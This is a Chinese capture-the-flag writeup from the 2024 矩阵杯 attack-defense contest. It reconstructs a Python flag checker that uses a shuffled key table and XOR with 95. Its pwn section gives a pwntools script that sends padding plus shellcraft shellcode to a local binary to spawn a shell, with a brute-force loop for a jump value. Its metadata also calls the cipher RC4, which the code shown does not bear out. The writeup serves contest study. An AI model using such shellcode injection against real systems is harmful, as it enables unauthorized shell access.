---
title: 矩阵杯战队攻防对抗赛 writeup by Mini-Venom
contest: 矩阵杯
year: 2024
difficulty: medium
vuln_type: reverse
tags: [Python字节码反编译, RC4加密, generate_key random.shuffle, encrypt key[byte]^95, base58, 矩阵杯攻防]
attack_chain: 字节码反编译得Python run.py→generate_key random.shuffle 256字节→encrypt key[byte]^95→解密得到flag→其他AWD部分pwn shellcode爆破跳转地址
key_payload: "run.py字节码;generate_key: random.seed+shuffle(range(256))+bytes(key);encrypt: encrypted.append(key[byte]^95);int_80=0x5dde8fe0;push_eax=0x5b597483"
one_liner: 矩阵杯攻防赛Mini-Venom WP：Python字节码RC4+矩阵杯reverse+pwn shellcode AWD
lesson: Python run.py可通过dis反编译得字节码再恢复；矩阵杯攻防赛综合
quality: medium
---

# 矩阵杯战队攻防对抗赛 writeup by Mini-Venom

**赛事**：矩阵杯战队攻防对抗赛

**性质**：综合攻防赛（Mini-Venom战队WP）

**Reverse部分：Python字节码反编译**

**run.py字节码分析**：
```python
# 字节码反汇编
# import random
# encdata = b'\x18\xfa\xad\xed\xab\xad\x9d\xe5\xc0\xad\xfa\xf9\x0b\xef\xf9\xe5\xad\xe6\xf9\xfd\x88\xf9\x9d\xe5\x9c\xe5\x9d\xc3)\x0f\xff'
# generate_key(seed)
# encrypt(data, key)
# flag = input('input your flag:')
# key = generate_key(len(flag))
# data = flag.encode()
# encrypted_data = encrypt(data, key)
# if encrypted_data == encdata: print('good')
```

**generate_key函数**：
```python
def generate_key(seed_value):
    key = list(range(256))
    random.seed(seed_value)
    random.shuffle(key)
    return bytes(key)
```

**encrypt函数**：
```python
def encrypt(data, key):
    encrypted = bytearray()
    for byte in data:
        encrypted.append(key[byte] ^ 95)
    return bytes(encrypted)
```

**关键操作**：
- `key[byte] ^ 95`：查表+异或0x5F
- random.shuffle(256) 决定key内容
- 需要爆破seed_value

**Pwn部分**：
```python
from pwn import *
p = process('./main')
context.arch = 'x86'
p.recvuntil('@:'); p.sendline('1')
p.recvuntil('ame:'); p.sendline('user')
p.recvuntil('ord:'); p.sendline('ozrrvnqc')
# ...
push_eax = 0x5b597483
pop_eax = 0x5b597a33
int_80 = 0x5dde8fe0
p.sendline(b'a'*0x22 + asm(shellcraft.sh()))
p.interactive()
```

**爆破脚本**：
```c
for (int i = 0x10000; i < 0x100000000 - 1; i++) {
    v4 = i;
    v11 = (long double)v4 / (long double)0xb4;
    // 检查特定字节匹配0x01eb53
    if ((*(int*)&v3) % 0x1000000 == 0x01eb53 && v3 > 0) {
        printf("%#x %#x %llf\n", v4, *(int*)&v3, v11);
        break;
    }
}
```

**质量评估**：中（Python字节码反编译 + pwn shellcode爆破）
